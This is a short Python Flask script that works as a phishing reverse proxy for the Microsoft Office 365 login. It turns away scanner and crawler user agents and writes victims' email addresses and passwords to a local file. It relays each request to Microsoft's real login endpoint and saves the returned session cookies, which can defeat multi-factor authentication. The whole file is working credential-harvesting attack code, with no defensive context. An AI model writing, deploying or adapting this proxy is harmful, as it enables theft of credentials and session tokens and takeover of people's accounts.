from flask import Flask, request, redirect
import requests

app = Flask(__name__)

OFFICE365_URL = "https://login.microsoftonline.com"

# Basic Anti-Bot Protection
def is_bot(user_agent):
    bot_keywords = ["bot", "crawl", "spider", "scanner"]
    return any(bot in user_agent.lower() for bot in bot_keywords)

@app.route("/", methods=["GET", "POST"])
def reverse_proxy():
    user_agent = request.headers.get("User-Agent", "")

    # Anti-Bot Detection
    if is_bot(user_agent):
        return "Access Denied", 403

    data = request.form.to_dict()
    headers = {key: value for key, value in request.headers}
    
    # Capture Credentials
    if "loginfmt" in data and "passwd" in data:
        with open("captured_logins.txt", "a") as f:
            f.write(f"Email: {data['loginfmt']}, Password: {data['passwd']}\n")
    
    # Forward Request to Microsoft
    resp = requests.request(
        method=request.method,
        url=OFFICE365_URL,
        headers=headers,
        data=data,
        cookies=request.cookies,
        allow_redirects=False
    )
    
    # Capture Cookies
    with open("cookies.txt", "a") as f:
        f.write(str(resp.cookies) + "\n")

    return resp.content, resp.status_code

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
